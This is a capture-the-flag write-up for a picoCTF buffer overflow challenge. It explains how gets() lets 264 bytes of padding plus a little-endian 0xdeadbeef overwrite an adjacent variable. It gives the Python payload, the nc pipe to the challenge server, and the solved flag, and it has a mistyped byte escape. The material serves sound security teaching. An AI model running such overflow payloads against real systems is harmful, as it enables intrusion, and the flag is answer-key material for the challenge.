# Challenge Description
The program reads user input into a buffer clutter using the unsafe gets() function. Our goal is to overflow this buffer to overwrite an adjacent 4-byte variable named code with the specific value 0xdeadbeef, bypassing a security check and printing the flag.

## Solution:

Source Code / Decompilation: Analyzing the binary (e.g., in Ghidra) reveals a main function with logic similar to this:

```
void main(void) {
  char clutter[264]; // Buffer size is 264 bytes
  int code;

  code = 0; // Variable is initialized
  gets(clutter); // Unsafe function reads input

  if (code == 0xdeadbeef) {
    print_flag(); // Our goal
  } else {
    printf("Wrong code\n");
  }
}
```
Vulnerability: The function gets() is notoriously insecure because it does not perform any bounds checking. It will continue writing input to the clutter buffer until it receives a newline, overflowing onto adjacent stack memory.

Stack Layout: Local variables are typically laid out sequentially on the stack. In this 64-bit binary, the clutter buffer is placed on the stack, and the code variable is placed immediately after it in memory.

Exploit Plan: Our payload must be a single string that fills the clutter buffer completely and then "spills over" to overwrite the code variable.

Padding: We need exactly 264 bytes of "junk" data to fill the clutter buffer.

Value: Immediately following the junk, we must provide the 4-byte value 0xdeadbeef.

Endianness: Since x86-64 systems are little-endian, the multi-byte value 0xdeadbeef must be written in reverse byte order: \xef\xbe\xad\de.

## Steps 

1. Determining the Offset
Static analysis with Ghidra or dynamic analysis with gdb is used to find the exact size of the clutter buffer.

Static Analysis (Ghidra/IDA): Decompiling the binary reveals the clutter buffer is 264 bytes long, and the code variable is placed on the stack immediately after it.

Dynamic Analysis (GDB):

Generate a De Bruijn sequence (a "cyclic pattern") using pwntools: cyclic(300).

Run the program in gdb: gdb ./chall.

Inside gdb, run the program with the pattern as input: r < <(cyclic(300)).

The program will either segfault or finish. We inspect the value of the code variable just before the if check.

Alternatively, check what value (e.g., 0x6161616a) overwrote the code variable. cyclic_find(0x6161616a) would then return the offset, 264.

2. Crafting the Payload
The payload will be [264 bytes of padding] + [4-byte value]. We can use Python to construct this.

```python

import struct

# 1. Padding: 264 'A' characters
# We use 'b' to create a byte string
padding = b'A' * 264

# 2. Value: 0xdeadbeef
# We use struct.pack with '<I' to pack it as a
# 4-byte (<I) little-endian (<) unsigned integer.
value = struct.pack('<I', 0xdeadbeef)
# This is equivalent to b'\xef\xbe\xad\de'

# 3. Final Payload
payload = padding + value
```
3. Executing the Exploit
We send this payload to the remote server using a pipe. The gets() function on the server will read our payload, overflow the clutter buffer, and set the code variable to 0xdeadbeef. The if condition will then pass, and the server will execute print_flag(), sending the flag back to us.

Local Python command:

```

# We use python3 -c "..." to print the raw bytes of our payload
# Note: We must use sys.stdout.buffer.write() to send raw bytes,
# as print() can mangle them.

python3 -c "import sys, struct; padding = b'A' * 264; value = struct.pack('<I', 0xdeadbeef); sys.stdout.buffer.write(padding + value)"
```
Full exploit pipe:

```

(python3 -c "import sys, struct; padding = b'A' * 264; value = struct.pack('<I', 0xdeadbeef); sys.stdout.buffer.write(padding + value)") | nc saturn.picoctf.net [PORT]

```
## Flag
```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```
## Concepts Learnt
Stack Buffer Overflow: The fundamental vulnerability where writing to a buffer on the stack exceeds its allocated bounds.

Unsafe C Functions (gets): A clear demonstration of why gets() was deprecated and is extremely dangerous. It has no mechanism to prevent overflows. fgets() is the safe alternative.

Stack Frame Layout: A deeper understanding of how a function's local variables are organized in memory. In this case, they were adjacent, allowing one to overwrite the other.

Data vs. Control Flow Attacks: This was a data-oriented attack. We didn't hijack the program's control flow (by overwriting a return address); we corrupted its data (the code variable) to trick its existing logic.

Endianness (Little-Endian): A critical concept in binary exploitation. Multi-byte numbers like integers (0xdeadbeef) are stored with the least-significant byte (ef) first in memory on x86/x64 systems. Our payload must match this format.

## Notes
Variable Overwrite vs. ROP: This attack is simpler than a standard Return-Oriented Programming (ROP) attack. Our goal was only to modify a variable's value, not to seize control of the instruction pointer (RIP).

Finding the Offset: The most common method for finding offsets in "pwn" challenges is using a De Bruijn sequence, or a "cyclic pattern," generated by pwntools. You send cyclic(300), let the program crash, and then see what value (e.g., 0x6161616a) overwrote the target. cyclic_find(0x6161616a) would then tell you the exact offset (e.g., 264).

Local vs. Remote: The program logic required a flag.txt to exist. This file is present on the remote server but must be created locally (e.g., echo "fake_flag" > flag.txt) for testing.

pwntools: The pwntools Python library simplifies this. p32(0xdeadbeef) is the pwntools equivalent of struct.pack('<I', 0xdeadbeef) and is the standard for CTF players.

## Resources
https://ghidra-sre.org/

https://github.com/Gallopsled/pwntools

https://www.sourceware.org/gdb/

https://www.youtube.com/watch?v=CRTR5ljBjPM


